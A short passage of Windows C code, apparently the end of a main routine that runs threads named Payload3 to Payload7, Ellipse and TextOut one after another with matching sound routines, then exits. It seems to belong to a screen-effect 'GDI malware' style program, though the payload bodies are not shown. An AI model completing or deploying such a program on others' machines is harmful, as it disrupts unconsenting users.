	CloseHandle(hP2);

	HANDLE hP3 = CreateThread(NULL, 0, Payload3, NULL, 0, NULL);
	HANDLE hEllipse = CreateThread(NULL, 0, Ellipse, NULL, 0, NULL);
	HANDLE hText = CreateThread(NULL, 0, TextOut, NULL, 0, NULL);
	Sound3();
	TerminateThread(hP3, 0);
	CloseHandle(hP3);
	TerminateThread(hEllipse, 0);
	CloseHandle(hEllipse);

	HANDLE hP4 = CreateThread(NULL, 0, Payload4, NULL, 0, NULL);
	Sound4();
	TerminateThread(hP4, 0);
	CloseHandle(hP4);

	HANDLE hP5 = CreateThread(NULL, 0, Payload5, NULL, 0, NULL);
	Sound5();
	TerminateThread(hP5, 0);
	CloseHandle(hP5);

	HANDLE hP6 = CreateThread(NULL, 0, Payload6, NULL, 0, NULL);
	Sound6();
	TerminateThread(hP6, 0);
	CloseHandle(hP6);

	HANDLE hP7 = CreateThread(NULL, 0, Payload7, NULL, 0, NULL);
	Sound7();
	TerminateThread(hP7, 0);
	CloseHandle(hP7);
	ExitProcess(0);
	return 0;
}
